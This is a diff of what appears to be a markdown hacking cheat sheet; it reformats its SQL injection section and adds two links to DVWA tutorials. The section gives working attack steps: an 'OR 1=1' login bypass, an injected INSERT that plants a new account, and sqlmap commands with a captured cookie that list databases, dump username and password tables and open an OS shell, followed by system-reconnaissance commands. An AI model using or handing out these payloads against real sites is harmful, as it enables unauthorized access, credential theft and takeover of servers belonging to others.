@@ -116,14 +116,22 @@ Now you can do a RDP connection with the given ip and the Test account which you
 ```
 #  SQL Injections
 ```
-1- Auth Bypass-  hi'OR 1=1 --
-2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
-3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie
+https://medium.com/@hashsleuth.info/how-to-exploit-dvwa-blind-sql-injection-sqli-with-sqlmap-and-burp-suite-e4b3f08a0dfc
+https://medium.com/@rafaelrenovaci/dvwa-solution-sql-injection-blind-sqlmap-cd1461ad336e
+
+1- Auth Bypass-
+	hi'OR 1=1 --
+2- Insert new details if sql injection found in login page in username tab enter-
+	blah';insert into login values('john','apple123');--
+3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie 
 Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
-sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
-4- Command to check tables of database retrieved-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
-5- Select the table you want to dump-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
-6- For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
+	sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
+4- Command to check tables of database retrieved
+	sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
+5- Select the table you want to dump
+	sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
+6- For OS shell this is the command
+	sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
 6.1 In the shell type-   TASKLIST  (to view the tasks)
 6.2 Use systeminfo for windows to get all os version
 6.3 Use uname -a for linux to get os version
